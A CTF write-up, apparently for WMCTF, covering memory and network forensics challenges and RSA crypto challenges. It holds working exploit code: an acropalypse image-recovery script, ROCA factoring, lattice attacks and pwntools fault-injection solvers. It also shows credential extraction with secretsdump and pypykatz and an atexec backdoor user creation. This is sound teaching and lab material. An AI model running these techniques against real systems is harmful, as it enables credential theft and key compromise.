python2 vol.py -f ../mem --profile=Linuxdebian11-5_10_0-21x64 linux_bash
```

![](https://cdn.ha1c9on.top/img/64e097fc661c6c8e54520714.jpg)

You can find the overall behavior is to open remmina and create a new configuration file, then read the data of event2, and then store the image's base64 data in b.txt

So you can restore the filesystem first, so that you can view the files directly.

```
python2 vol.py -f ../mem --profile=Linuxdebian11-5_10_0-21x64 linux_recover_filesystem -D ./filesystem
```

After recovery, you can find the files you want to see are on the root's desktop.

First look at a.txt, because it is stored in the event2 data, understand the principle of direct scripting can draw the mouse track out!

Probably read 24 bytes at a time, the first 16 - are time, after two is type, and then after two is code, and then the back is value

Here we have to pay attention to the size of the end

```
import struct
import matplotlib.pyplot as plt
f=open('a.txt').readlines()
ff = ''
for i in f:
    ff += i.replace(' ','')[7:]
ff = bytes.fromhex(ff)

key_x = []
key_y = []

while 1:
    if len(ff) < 24:
        break
    data = ff[:24]
    ff = ff[24:]
    type = int.from_bytes(data[16:18], byteorder='big')
    code = int.from_bytes(data[18:20], byteorder='big')
    value = int.from_bytes(data[20:22], byteorder='big')
    if(type == 1):
        minlen = min(len(key_x), len(key_y))
        key_x = key_x[:minlen]
        key_y = key_y[:minlen]
        fig, ax = plt.subplots()
        ax.plot(key_x, key_y)
        ax.set_aspect('equal')
        plt.show()
        key_x = []
        key_y = []
    elif(type == 3 and code == 0 ):
        key_x.append(value)
    elif(type == 3 and code == 1 ):
        key_y.append(value * -1)
```

Run the script to get the mouse track, there will be an unimportant track between every two characters (probably drawn a bit poorly)

![](https://cdn.ha1c9on.top/img/64e09a88661c6c8e5459f444.jpg)

This gives us flag1

```
flag1: WM{ca7_eve2_
```

Then you can take a look at that image, and after decrypting the base64 you find two ending blocks, and when you see this structure it's easy to think that here is the screenshot fix for the vulnerability that was previously blown up --> https://www.da.vidbuchanan.co.uk/blog/exploiting-acropalypse.html

But to fix it, you still need the resolution of the original image, this time you need to check the new remmina configuration file, location in /root/.local/share/remmina

Open the configuration file can be found in the settings of the rdp when the screen resolution of 1152x864

So use this resolution to restore flag.png, because the screenshot here is 32-bit depth, so we have to modify part of the script given by the original author, the complete script is as follows

```
import zlib
import sys
import io

if len(sys.argv) != 5:
    print(
        f"USAGE: {sys.argv[0]} orig_width orig_height cropped.png reconstructed.png")
    exit()

PNG_MAGIC = b"\x89PNG\r\n\x1a\n"


def parse_png_chunk(stream):
    size = int.from_bytes(stream.read(4), "big")
    ctype = stream.read(4)
    body = stream.read(size)
    csum = int.from_bytes(stream.read(4), "big")
    assert (zlib.crc32(ctype + body) == csum)
    return ctype, body


def pack_png_chunk(stream, name, body):
    stream.write(len(body).to_bytes(4, "big"))
    stream.write(name)
    stream.write(body)
    crc = zlib.crc32(body, zlib.crc32(name))
    stream.write(crc.to_bytes(4, "big"))


orig_width = int(sys.argv[1])
orig_height = int(sys.argv[2])

f_in = open(sys.argv[3], "rb")
magic = f_in.read(len(PNG_MAGIC))
assert (magic == PNG_MAGIC)

# find end of cropped PNG
while True:
    ctype, body = parse_png_chunk(f_in)
    if ctype == b"IEND":
        break

# grab the trailing data
trailer = f_in.read()
print(f"Found {len(trailer)} trailing bytes!")

# find the start of the nex idat chunk
try:
    next_idat = trailer.index(b"IDAT", 12)
except ValueError:
    print("No trailing IDATs found :(")
    exit()

# skip first 12 bytes in case they were part of a chunk boundary
idat = trailer[12:next_idat-8]  # last 8 bytes are crc32, next chunk len

stream = io.BytesIO(trailer[next_idat-4:])

while True:
    ctype, body = parse_png_chunk(stream)
    if ctype == b"IDAT":
        idat += body
    elif ctype == b"IEND":
        break
    else:
        raise Exception("Unexpected chunk type: " + repr(ctype))

idat = idat[:-4]  # slice off the adler32

print(f"Extracted {len(idat)} bytes of idat!")

print("building bitstream...")
bitstream = []
for byte in idat:
    for bit in range(8):
        bitstream.append((byte >> bit) & 1)

# add some padding so we don't lose any bits
for _ in range(7):
    bitstream.append(0)

print("reconstructing bit-shifted bytestreams...")
byte_offsets = []
for i in range(8):
    shifted_bytestream = []
    for j in range(i, len(bitstream)-7, 8):
        val = 0
        for k in range(8):
            val |= bitstream[j+k] << k
        shifted_bytestream.append(val)
    byte_offsets.append(bytes(shifted_bytestream))

# bit wrangling sanity checks
assert (byte_offsets[0] == idat)
assert (byte_offsets[1] != idat)

print("Scanning for viable parses...")

# prefix the stream with 32k of "X" so backrefs can work
prefix = b"\x00" + (0x8000).to_bytes(2, "little") + \
    (0x8000 ^ 0xffff).to_bytes(2, "little") + b"X" * 0x8000

for i in range(len(idat)):
    truncated = byte_offsets[i % 8][i//8:]

    # only bother looking if it's (maybe) the start of a non-final adaptive huffman coded block
    if truncated[0] & 7 != 0b100:
        continue

    d = zlib.decompressobj(wbits=-15)
    try:
        decompressed = d.decompress(prefix+truncated) + d.flush(zlib.Z_FINISH)
        decompressed = decompressed[0x8000:]  # remove leading padding
        # there might be a null byte if we added too many padding bits
        if d.eof and d.unused_data in [b"", b"\x00"]:
            print(f"Found viable parse at bit offset {i}!")
            # XXX: maybe there could be false positives and we should keep looking?
            break
        else:
            print(
                f"Parsed until the end of a zlib stream, but there was still {len(d.unused_data)} byte of remaining data. Skipping.")
    except zlib.error as e:  # this will happen almost every time
        # print(e)
        pass
else:
    print("Failed to find viable parse :(")
    exit()

print("Generating output PNG...")

out = open(sys.argv[4], "wb")

out.write(PNG_MAGIC)

ihdr = b""
ihdr += orig_width.to_bytes(4, "big")
ihdr += orig_height.to_bytes(4, "big")
ihdr += (8).to_bytes(1, "big")  # bitdepth
ihdr += (6).to_bytes(1, "big")  # true colour
ihdr += (0).to_bytes(1, "big")  # compression method
ihdr += (0).to_bytes(1, "big")  # filter method
ihdr += (0).to_bytes(1, "big")  # interlace method

pack_png_chunk(out, b"IHDR", ihdr)

# fill missing data with solid magenta
reconstructed_idat = bytearray(
    (b"\x00" + b"\xff\x00\xff\xff" * orig_width) * orig_height)

# paste in the data we decompressed
reconstructed_idat[-len(decompressed):] = decompressed

# one last thing: any bytes defining filter mode may
# have been replaced with a backref to our "X" padding
# we should fine those and replace them with a valid filter mode (0)
print("Fixing filters...")
for i in range(0, len(reconstructed_idat), orig_width*4+1):
    if reconstructed_idat[i] == ord("X"):
        #print(f"Fixup'd filter byte at idat byte offset {i}")
        reconstructed_idat[i] = 0

pack_png_chunk(out, b"IDAT", zlib.compress(reconstructed_idat))
pack_png_chunk(out, b"IEND", b"")

print("Done!")
```

You can know the encryption method after recovery

![](https://cdn.ha1c9on.top/img/64c8f15c1ddac507cc3333f1-20230821224224596.jpg)

The content of 1.txt is the text in the original image

```
WMCTF{fake_flag_lol}
```

Decrypt it to get flag 2.

```
openssl enc -d -aes-128-cbc -pbkdf2 -pass file:./1.txt -a -in flag -out flag.txt
```

```
flag2: @nd_R3c0v3R_TruNc@t3d_ImaG3!}
```

Splice to get the final flag

```
WM{ca7_eve2_@nd_R3c0v3R_TruNc@t3d_ImaG3!}
```

Combine the description of the topic to get the correct flag

```
WMCTF{ca7_eve2_@nd_R3c0v3R_TruNc@t3d_ImaG3!}
```

### Fantastic terminal

#### Grab the program source code and analyze it



Data carryover using base64

![image-20230804205728098](https://cdn.ha1c9on.top/img/image-20230804205728098.png)



Decode the resulting base64-encoded data

![image-20230804205858436](https://cdn.ha1c9on.top/img/image-20230804205858436.png)



You can get the flag

#### Capture memory data for analysis

Essentially this question is based on WASI + Docker + Bochs to achieve the effect, so theoretically all the data of the container will exist in memory

Start the browser's task manager, locate the pid for the tab's process, go into the task manager and analyze it after making a dump of the process

![image-20230804204247190](https://cdn.ha1c9on.top/img/image-20230804204247190.png)

You can get the flag directly

### Ghost

Traffic packet export HTTP object, you can get the encrypted flag.7z, export SMB object, you can get the SYSTEM and NTDS![image-20230805162755012](https://cdn.ha1c9on.top/img/image-20230805162755012.png)

With SYSTEM and NTDS, you can create a keytab，[参考文章](https://medium.com/tenable-techblog/decrypt-encrypted-stub-data-in-wireshark-deb132c076e7)

You can't get the user hash with the two directly exported files because the SYSTEM file is corrupted, SYSTEM is originally an exported registry, and the registry file has a fixed structure，[参考文章](https://blog.csdn.net/zacklin/article/details/7682582)

Comparing the structure, we can see that the SYSTEM file does not have a basic block (the first block) signed with `regf`. Exporting the SYSTEM file by yourself and comparing it, we can see that the first block is of the same size, and its content doesn't affect the parsing of it by the script, so we can export the host SYSTEM registry by ourselves, and add to the content of the first block.![image-20230805164708508](https://cdn.ha1c9on.top/img/image-20230805164708508.png)

Although the supplemented SYSTEM file can be parsed, but still can not get the user hash, indicating that the file is still corrupted, which involves the principle of obtaining the user hash from the registry, in this part of the impacket and mimikatz's lsadump module principle is more or less the same, both have to extract the bootKey from the SYSTEM，[参考文章](https://www.chuanpuyun.com/article/5597.html)

To get the bootKey, you need to resolve the four keys in the

 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\` registry path.

![image-20230805164441629](https://cdn.ha1c9on.top/img/image-20230805164441629-20230812170951930.png)

Open the registry to find the corresponding directory, you can see that these four keys correspond to four names

```
JD -> Lookup
Skew1 -> SkewMatrix
GBG -> GrafBlumGroup
Data -> Pattern
```

Use a hex editor to search for these four names in the SYSTEM file, and you can find the locations of these four keys. Look at the impacket source code (above), and you can see that the script needs to locate the key locations by the characters of these four keys, so you can parse it normally by modifying the `Sk..1` to `Skew1` (you need to modify both locations).

![image-20230805165301139](https://cdn.ha1c9on.top/img/image-20230805165301139.png)

After modifying it, you can use secretsdump to get the full user's hash.

![image-20230805165627906](https://cdn.ha1c9on.top/img/image-20230805165627906.png)

With the hash you can make keytab files to decrypt the traffic, after decryption you can see some of the encrypted SMB traffic in the original file you can see the content, directly flip through the traffic you can see that there are some obvious TaskSchedulerService traffic, combined with the name of the tmp file, if you are familiar with the intranet, it can be easily judged to be the use of atexec. If you are familiar with the intranet, you can easily tell that atexec is being used. atexec utilizes the creation of scheduled tasks to achieve remote command execution, and you can see the plain text of the xml file that uses atexec to generate scheduled tasks in the traffic.

In the 27352 traffic entries, we can find the command to create a new WMHACKER user with the password Admin123123.

![image-20230805171456079](https://cdn.ha1c9on.top/img/image-20230805171456079.png)

The follow-up (27455) also added this user to the local administrators group

![image-20230805171642661](https://cdn.ha1c9on.top/img/image-20230805171642661.png)

However, the user hash obtained through SYSTEM and NTDS at the beginning does not contain this user, which means that the keytab produced can not decrypt the use of this user to interact with the traffic, and the traffic packet subsequently there are a large number of SMB encrypted traffic, so the idea of adding the user hash to the keytab, you need to set up their own domain environment, add the user, and then export user hash

![image-20230805172150766](https://cdn.ha1c9on.top/img/image-20230805172150766.png)

Decrypting the traffic with the new keytab also yields some traces of atexec's exploits, and in 27659 you can see the decompression command, which contains the zip password

![image-20230805173009735](https://cdn.ha1c9on.top/img/image-20230805173009735.png)

Or just copy the command to unzip it

```
7z x -pEAE75D36E30F9B038845B1CBD7D4C800 flag.7z -o./
```

### Oversharing

Checking the pcap traffic packet reveals that there is a large amount of SMB traffic

![image-20230804200037027](https://cdn.ha1c9on.top/img/image-20230804200037027.png)

So the SMB traffic was analyzed directly

![image-20230804200202024](https://cdn.ha1c9on.top/img/image-20230804200202024.png)



A memory dump file for the lsass service was found to exist, and was analyzed using pypykatz

```shell
pypykatz lsa minidump lsass.DMP
```

The following sensitive information can be seen:

```plaintext
== CREDMAN [4f9b8]==
	luid 326072
	username randark
	domain ssh@192.168.20.202:22/randark
	password 1a05cf83-e450-4fbf-a2a8-b9fd2bd37d4e
	password (hex)310061003000350063006600380033002d0065003400350030002d0034006600620066002d0061003200610038002d00620039006600640032006200640033003700640034006500
```

So a suspicious looking ssh credential was obtained, and the password for this credential was decoded:

```python
import re
a="310061003000350063006600380033002d0065003400350030002d0034006600620066002d0061003200610038002d00620039006600640032006200640033003700640034006500"
a=re.findall(r'.{2}', a)
data=[]
for i in range(0,len(a),2):
    data.append(a[i])
result = ''.join([chr(int(i, 16)) for i in data])
print(result)
# 1a05cf83-e450-4fbf-a2a8-b9fd2bd37d4e
```

Just get a copy of the string, guessing that it's the login password for the target machine, and try to log in

![image-20230804203038103](https://cdn.ha1c9on.top/img/image-20230804203038103.png)

And that's how you get the flag.

## Crypto

### badprime

It's actually a cve (CVE-2017-15361) that does this by submitting the order of 65537 as a factor of the smaller M on top of it, which makes a very small

```python
from sage.doctest.util import Timer
t = Timer()

L = 0x7cda79f57f60a9b65478052f383ad7dadb714b4f4ac069997c7ff23d34d075fca08fdf20f95fbc5f0a981d65c3a3ee7ff74d769da52e948d6b0270dd736ef61fa99a54f80fb22091b055885dc22b9f17562778dfb2aeac87f51de339f71731d207c0af3244d35129feba028a48402247f4ba1d2b6d0755baff6
g = Mod(65537,L)

pmin = 3*2**1022
pmax = 4*2**1022

p = 119949297823304007163602750328870391606548779718070065324766633638259841939589549994095387946619248438497339849221415471645532921809358722871360231737322831463096854247759249766367829886583523947636952483726472899501770613135658534476120556587962031682504046820345732516331262954429216339141280964449499359983
n = 19807826992583521250431605870196413245365136314869741490002104280652366308632165313760212277782501214004565242950974066601397923682737778720436468720382474478235064191521362420031564770913641262988586682000357716497592630218790724907173726965450371494113979140305229061655699467992501647949265532733053410019415270972975479654141623451913791822360781514630565929921143757567864778890510836686621302319405359981077678783318003917128556117114849777515891030325901596390420589871218059230490823503152102165169768689027574992715596780402524541734444046121490095248121766937156745199111285909451067406877297015574617767327
print ('public key',n)

smooth = 2^7*3^3*5^2*7*11*13*17*19*23
print ('smooth',smooth)
def smoothorder(l):
  return smooth % Mod(g,l).multiplicative_order() == 0

v = prod(l for l,e in factor(L) if smoothorder(l))
print (v)
u = p % v
print ('p residue class',(p-u)/v)

t.start()

H = 10 + 2**1021 // v
u += floor((7*2**1021) // v) * v

w = lift(1/Mod(v,n))

R.<x> = QQ[]
f = (w*u+H*x)/n
g = H*x

k = 3
m = 7
print ('multiplicity',k)
print ('lattice rank',m)

basis = [f^j for j in range(0,k)] + [f^k*g^j for j in range(m-k)]
basis = [b*n^k for b in basis]
basis = [b.change_ring(ZZ) for b in basis]

M = matrix(m)
for i in range(m):
  M[i] = basis[i].coefficients(sparse=False) + [0]*(m-1-i)
print ('time for creating matrix',t.stop().cputime)

t.start()
M = M.LLL()
print ('time for basis reduction',t.stop().cputime)

Q = sum(z*(x/H)^i for i,z in enumerate(M[0]))

for r,multiplicity in Q.roots():
  print ('root is',r)
  if u+v*r > 0:
    g = gcd(n,u+v*r)
    if g > 1: print ('successful factorization',[g,n/g])
```

There is a greater chance of successful decomposition n

### signin

Check-in question, partly inspired by a previous buuctf question

Decompose n

```python
from tqdm import trange

def check_bits(p_bit, q_bit, p_num, q_num, n_b):
    p = int(p_bit + p_num, 2)
    qlow = int((q_bit + q_num)[-len(p_num) - 1:], 2)
    n = bin(p * qlow)[2:]
    n = n[len(n) - (len(p_num)+1):]
    return n_b.endswith(n)

def factorize_n(x, n):
    x_b = '0' + bin(x)[2:].rjust(496,'0')
    n_b = bin(n)[2:]
    queue = []
    for i in trange(1,65536,2):
        queue.append((1,'1','1'+bin(i)[2:].rjust(16,'0')))

    tmpl = 0
    while queue:
        l, p_b, q_b = queue.pop(0)
        if l!=tmpl:
            tmpl = l
            print(l,len(queue))

        if l >= 512-16:
            if n % int(p_b,2) == 0  or n % int(q_b,2) == 0:
                print(int(q_b,2))
                return  (int(p_b,2)) ,  (int(q_b,2))

        x_bit = x_b[::-1][l]
        if x_bit == '0':
            if check_bits('0', '0', p_b, q_b, n_b):
                queue.append((l+1, '0'+p_b, '0'+q_b))

            if check_bits('1', '1', p_b, q_b, n_b):
                queue.append((l+1, '1'+p_b, '1'+q_b))

        elif x_bit == '1':
            if check_bits('1', '0', p_b, q_b, n_b):
                queue.append((l+1, '1'+p_b, '0'+q_b))

            if check_bits('0', '1', p_b, q_b, n_b):
                queue.append((l+1, '0'+p_b, '1'+q_b))
n = 57252869175637212568236748640925893827160364084453077592917520099746923875450673203603122133211413258193637689074143351818835395604472446180951873843259943128920430046860737145456699076020104424455592112300084656390276993199353749868155331424480732785402069537620405984757756117761662821257241121160688236059 
x = 9490317877722370366220947396358892780057993488031240787042699498466930877039204847729338907643916122079293748219234616642879370438435175064743981096  
# print(len(bin(x1)))
q = factorize_n(x, n)
p = n//q
```

Then there's the simple hnp

```python
p = 13069431200886265537001586157218694353609198430802370736318329550702794255703546553999035892073565012935857045988471420505276499177341376677245399268015729
bs = [7985928586953925271375739101982050171597371464562675324677194505571236401610965801142635320335801840127281833818339610435024434508048848908329150054391442, 2779179752638185211731196681582087404490375040089261984390247706727766526772220984957732932258580726359236606912050516088399703014879191223513324325249744, 5957090134892682915148728697296766471113217538918437557018386189034050524442167613231653823908697532882200879059466265926689296668594416339062080940658841, 8778964766022300712018244566167487763950450319658215251205731632050696126719490762768511119667552948384164976006688614182419442527555348340875538150129022, 5654494785299467114600749446547641046685646240137177143283124953362883613949651864800086867522297344350484160328162923330838787370140337409084955422225642, 9808029790124631699764409791564006267357077352469032519288610055432116892781673597807490563247474528913508397992109882333794414022501544528031043559125230, 12831778633568734298468989146207272262614946691936131647933388178695946547500217713662792218832910068568276583581366256902820912032428835215716193809524114, 5499904468390112394521533617202301108817542726737855397740298486883977209095021112928111141412927311417109886223067933071490084759541851985251515909152361, 10618752175910043302272740484632168893461333628195438429319983095228691046187036526956248787441460253357429588505627148999550042146207685836839694370081499, 10229590851158471914357648539655273679260875817170070383253924572940804345312224685779553890242235322332276896026044243625365145681194847291421967653117158, 1847627739106586513447516091484207688395611814381351546351212746830815773104496964320117696685360350841257305747634519263848045393823266539266803480683522, 12766274647057655920640115604350937653164504135335952036705559616096985009823829195009514876011108124649971337270499966673914642871378246307598504869402498, 10193780281641675654937343491340118627588830156095459803628844472031533339211875519073105928478885430873486509945570825634769276164447711669904842458975320, 10767877973825154873545279201729695689997135914287949586480656622093565017247336052994836411855179958920169916981928744022409315406368213044187274090984912, 647380302198273132258496946176534331189448062852361470221687188323363124727492704568097999264057808875198993895249863944830072153951430746316749769522659, 11555506770310033865072509178444235629855877955171028871759157273465523002505459234265747884772147672409403311694280305791141170116503248441824114420095302, 9982532266813217416059256481097203392145386503900715248652147666993972529628918990307151042855725763050130676573085771558301864644997136540993785073727965, 744013214576846946054115141916693068491275615493161145799432662164325135612197067821579491197806617320856121370273809555837748180273326079516021918531364, 4201303883017182505101349654607969532119767397627025702212583394891631498414690878233517370124226868558367176788063392049016290825878576803083485111506945, 5269978486091127016511021436837988246533903981670486152321093027577685815325339833747555734981918186859940996294493819516411706523250464154046338872747072, 9776684308698030867923944122729554264401160134478546041977724596725780449976088254505898271699522683864842076278944633751830271008943215946473565713040967, 6867753629073425880243274392752300484441480687153413348666203662094668629336610234842295784233797133890984453249394650657993314960447903373898541170762637, 10720837492294645391527412053160592727741130164979412521209259411490760346146169463945024685873001228789255012616072026603737355116890054486357983963724388, 6907681559227686172390185885058616481610833859407267428004251170302603182756592846977027135313157157495761135037356825046805466405487317829186761883658807, 9214234856436932409607408126018692071536525459051365986952670191523720762587140877324085587523293412945968495344711900575984829884559982681391438952262868, 1594539209345311877418816711892172349482633286793419468631258969094687990561704843995879011994634386125607563665840318642507527044690392504642521811920091, 12890771377755087121816924077795423982734018812502581456185239245977388667765151586967105199593312255311191814212721286722392637799077313871589008599669153, 5400376736704401556853440466900145212226392736429008989461596878790583788284068940118632479530605910065003815707529981583704996138980390558053468577816046, 8297690692540995345082291397643667664548989828067499440236727151989832813376036322343020949906023879040557619677630212848738313756100234770789469783066829, 3616082006340056100284955939141717638707846781692178586502802327515658355591504403967223048949879753993704233898544745317039706673035105268655946658052683, 5526388088947885136195286206202787384211302747288906280257201768930517124785199159927048153723009471472368199414413811726197201060685551326721258832789720, 6166034178163913712791337959372785398008982012614085917316076194038445222966012583577882734630736754953894544604121671982089960180261708084262221046128611, 12466794441663468626859040895771923161098353239484458837310994478644580580584306816583217346285577830357602002123233740158860010288430555235167304322907460, 436545699769996811042518154671435312178205091904510173794190527221794651981549010400102971731593327932551850027933355534083212564520278777872847446946578, 11054091445750149286735077811314085677971105967108879826282766731327263205419056229761960680821444659788557843870628534413580052188442940154256562399418508, 7904183631730350109273382468837990449460592304984581877780525960067635805198797072569827591135676479603053124964362014578405189505731442993339371111704958, 5395106401210302349187902248637866718011091440528292648024820922509625247612667041987143158939218495456012266440665367597128392142950157806747663130801795, 12753427159920461501526496307538683697909326626081372560633563224438441610638661969416920091519308441313584224063138519681786528289869947974179598023433826]
rs = [32575, 8331, 38341, 880, 57255, 23322, 32743, 20829, 23232, 7676, 34860, 45086, 24766, 38647, 53349, 39023, 63714, 7197, 24557, 26351, 35471, 20540, 7168, 26313, 427, 32022, 11690, 1000, 52712, 37751, 57511, 46071, 55740, 60443, 64107, 8106, 21202, 1485]
xx = 2567269449395731757406127144140018015566291770960585103898960024009577900389618351899793385860477640769561715741426011216820879021723148773127995195110584

cols = len(rs)
M = Matrix(ZZ,cols+2,cols+2)

tmpb = [int(bi * inverse_mod(2**16,p)) << 16  for bi in bs]
tmpc = [int(ri * inverse_mod(2**16,p)) << 16 for ri in rs]

for i in range(cols):
    M[i,i] = p << 16

M[-2] = tmpb + [1,0]
M[-1] = tmpc + [0,2^512]

ML = M.LLL()
for mi in ML:
    if abs(mi[-1]) == 2^512:
        if mi[-2] % p == xx:
            print(mi)
        if abs(mi[-2]) % p == xx:
            print(mi)
        if abs(- mi[-2]) % p == xx:
            print(mi)
        if - mi[-2] % p == xx:
            print(mi)
```

### welcome_signer1

Reference《Fault Attacks on RSA Public Keys: Left-To-Right Implementations are also Vulnerable》

Short Description: Use Right-to-Left algorithm for signature calculation.

```python
def Left_to_Right(m,d,N):
    A = 1
    d = d.bits()[::-1]
    n = len(d)
    for i in range(n-1,-1,-1):
        A = A*A % N
        if d[i] == 1:
            A = A * m % N
    return A
```

error injection model

```python
def fault_left_to_right_exp(m,d,N,j,N_):
    A = 1
    d = d.bits()[::-1]
    n = len(d)
    for i in range(n-1,-1,-1):
        if i < j:
            #print(A)
            N = N_
        A = A*A % N
        if d[i] == 1:
            A = A * m % N
    return A
```

Correct signature
$$
S \equiv m^{\sum_{i=0}^{n-1}2^i\cdot d_i} \pmod N	
$$
The error is injected with：
$$
A \equiv m^{\sum_{i=j}^{n-1}2^{i-j}\cdot d_i} \mod N
$$
The error signature expression is then：
$$
\hat S \equiv (((A^2\cdot m^{d_{j-1}})^2 \cdot m^{d_{j-2}})^2 \cdots )^2 \cdot m^{d_0} \mod \hat N \\
\equiv A^{2j} \cdot m^{\sum_{i=0}^{j-1}2^i \cdot d_i} \mod \hat N
$$
Attack conditions: known $N,\hat N,S$，Injection position $j$（Controllable) known, error modulus $\hat N$ Decomposable or prime。自dLow-level blasting private keys $d'$，

first calculation
$$
R = \hat S \cdot m^{-d'}
$$
and then verify $R$ Is it a secondary surplus, if so open the root，开 $j$ 次，Note that for each opening, a judgment is made on the two roots, discarding the non-quadratic residuals among them, so that the solution set will always be only two。
$$
R = R^{\frac{1}{2^j}}
$$
refinement
$$
S' \equiv  R^{2^j} \cdot m^{d'} \mod N
$$
Check to see if it meets $S' \equiv S \mod N$





```python
from Crypto.Util.number import *
from Crypto.Cipher import AES
from hashlib import md5
from sympy import isprime
from tqdm import tqdm 
import random
from pwn import *

# context.log_level = 'debug'

def get_sig(j):
    sh.recvuntil("[Q]uit\n")
    sh.sendline("S")
    sh.recvuntil("interfere:")
    sh.sendline(str(j))
    sh.recvuntil(" is ")
    sigs = sh.recvuntil("\n")[:-1]
    return int(sigs)

def decrypt(message,key):
    key = bytes.fromhex(md5(str(key).encode()).hexdigest())
    enc = AES.new(key,mode=AES.MODE_ECB)
    c   = enc.decrypt(message)
    return c



#sh = process(["python","task.py"])
sh = remote("0.0.0.0",9999)
sh.recvuntil("[Q]uit\n")
sh.sendline("G")

sh.recvuntil("| n = ")
n = int(sh.recvuntil("\n")[:-1])
sh.recvuntil("ciphertext = ")
cipher = bytes.fromhex(sh.recvuntil("\n").decode()[:-1])



for _ in range(10000):
    index = random.randint(0,1024)
    temp = random.randint(0,256)
    n_ = n ^ (temp<<index)
    if isprime(n_) and n_ % 4==3:
        print("[+]",n_)
        break
else:
   exit()
sig = get_sig(0)
print("[+]",sig)

print("[+] cipher",cipher)
print("[+] n",n)

sh.recvuntil("[Q]uit\n")
sh.sendline("F")
sh.recvuntil("index:")
sh.sendline(",".join([str(temp),str(index)]))

# poc ps: associate with coppersmith will be more efficient

dd=0

for j in tqdm(range(1,300)):
    sig_ = get_sig(j)
    #print(j)
    for i in range(2):
        d_ = (i<<j-1) + dd
        #print(d_)
        R = (sig_ * pow(msg,-d_,n_)) % n_
        for _ in range(j):
            R = pow(R,(n_+3)//4,n_)
            
        if (pow(R,2**j,n) * pow(msg,d_,n)) % n == sig or (pow(n_-R,2**j,n) * pow(msg,d_,n)) % n == sig:
            dd = d_
            print("[+]",dd)
            break
    else:
        print("[-] error")
        exit()

print("[+] part of d",dd)

```



```python
from Crypto.Util.number import *
from Crypto.Cipher import AES
from hashlib import md5
import random

def decrypt(message,key):
    key = bytes.fromhex(md5(str(key).encode()).hexdigest())
    enc = AES.new(key,mode=AES.MODE_ECB)
    c   = enc.decrypt(message)
    return c

def recover_p(p0, n,d0bits):
    PR.<x> = PolynomialRing(Zmod(n))
    nbits = n.nbits()
    p0bits = p0.nbits()
    f = 2^p0bits*x + p0
    f = f.monic()
    roots = f.small_roots(X=2^(nbits//2-p0bits+10), beta=0.4)  
    #print(roots)
    if roots:
        x0 = roots[0]
        p = gcd(2^d0bits*x0 + p0, n)
        return ZZ(p)

    
def find_p0(d0, e, n):
    X = var('X')
    for k in range(1, e+1):
        results = solve_mod([e*d0*X == k*n*X + k*X + X-k*X**2 - k*n], 2^d0.nbits())
        #print(results)
        for x in results:

            p0 = ZZ(x[0])
            #print(p0.nbits())
            p = recover_p(p0, n, d0.nbits())
            if p and p != 1:
                return p

from Crypto.Util.number import *
            

e = 17

n = 73468676168622364284797821322152865781682180355500517056745668297165363555301096288101727335605000017268011253011119083984169415642723459174940543244081395676001820974756949196348450763644469053660647326752189360358283884531064841995272730690738485358497415320211291684980496435204196241103362533593881904523


d0 = 62760647033001752398354920856119694316831379748195717723129573742917034443985946161152177


cipher = b'm\xcc\xed\xd9m?x}\x00\xdf\x85\x07jk\xefw\xbc\xb5i+\xcfpi\xf2]\x81#\xd0\xcc\x17<\x98\x15\x0ei\xea\xde\xe7\xadm\x8d\xff\xe5g\xe52"v'

p = int(find_p0(d0, e, n))
q = n//int(p)
d = inverse_mod(e, (p-1)*(q-1))
print(decrypt(cipher,d))

```

### welcome_signer2

referable：《Perturbating RSA Public Keys: an Improved Attack》

Short description: Right-to-Left algorithm is used to calculate the signature.

```python
def Right_to_Left(self,j):
    A = 1
    B = self.m
    d = self.d.bits()
    n = len(d)
    N = self.N
    for i in range(n):
        if d[i] == 1:
            A = A * B % N
        B = B**2 % N
    return A
```

error injection model

```python
def fault_model(self,j):
    A = 1
    B = self.m
    d = self.d.bits()
    n = len(d)
    N = self.N
    for i in range(n):
        if d[i] == 1:
            A = A * B % N
            #  a fault occurs j steps before the end of the exponentiation
        if i >= n-1-j:
            N = self.N_
        B = B**2 % N
    return A
```

The correct signature is
$$
S \equiv m^{\sum_{i=0}^{n-1}2^i\cdot d_i} \pmod N
$$
After the wrong injection, the expression for the wrong B
$$
\hat{B} \equiv (m^{2^{n-j-i}} \mod N)^2 \mod \hat N
$$
So the wrong signature is
$$
\hat S \equiv ((A\cdot \hat B)\dots)\hat B^{2^{j-1}} \\
\equiv A\cdot \hat B^{\sum_{i=(n-j)}^{n-1}2^{[i-(n-j)]}} \mod \hat N \\
\equiv [(m^{\sum_{i=0}^{(n-j-i)}2^i\cdot d_i} \mod N)\cdot (m^{2^{n-j-1}} \mod N)^{\sum_{i=(n-j)}^{n-1}2^{[i-(n-j)+1]}\cdot d_i}] \mod \hat N 
$$
Attack conditions: known $N,\hat N,S$，Injection position $j$(Controllable) known, since the high level blast private key $d'$，计算签名，
$$
S' \equiv [((S\cdot m^{-d'}) \mod N)\cdot (m^{2^{(n-j-1)} } \mod N)^{2^{[1-(n-j)]\cdot }d'}] \mod \hat N
$$
Verify that there is
$$
S' \equiv \hat S \mod \hat N
$$
to determine if the blasted $d'$ is correct.。

```python
from Crypto.Util.number import *
from Crypto.Cipher import AES
from hashlib import md5
from sympy import isprime
from tqdm import tqdm 
import random
from pwn import *

# context.log_level = 'debug'

def get_sig(j):
    sh.recvuntil("[Q]uit\n")
    sh.sendline("S")
    sh.recvuntil("interfere:")
    sh.sendline(str(j))
    sh.recvuntil(" is ")
    sigs = sh.recvuntil("\n")[:-1]
    return int(sigs)

def decrypt(message,key):
    key = bytes.fromhex(md5(str(key).encode()).hexdigest())
    enc = AES.new(key,mode=AES.MODE_ECB)
    c   = enc.decrypt(message)
    return c


def decrypt(message,key):
    key = bytes.fromhex(md5(str(key).encode()).hexdigest())
    enc = AES.new(key,mode=AES.MODE_ECB)
    c   = enc.decrypt(message)
    return c

msg = bytes_to_long(b"Welcome_come_to_WMCTF")

# sh = process(["python","task.py"])
sh = remote("0.0.0.0",9999)
sh.recvuntil("[Q]uit\n")
sh.sendline("G")
sh.recvuntil("| n = ")
n = int(sh.recvuntil("\n")[:-1])
sh.recvuntil("ciphertext = ")
cipher = bytes.fromhex(sh.recvuntil("\n").decode()[:-1])



index = random.randint(0,1024)
temp = random.randint(0,256)
n_ = n ^ (temp<<index)

sig = get_sig(0)



sh.recvuntil("[Q]uit\n")
sh.sendline("F")
sh.recvuntil("index:")
sh.sendline(",".join([str(temp),str(index)]))

# poc ps: associate with coppersmith will be more efficient

d = 0
j = 1
sig_ = get_sig(j)

length = n.bit_length()
for offset in range(8):
    i=1
    d_ = (i << (length-j)) + d
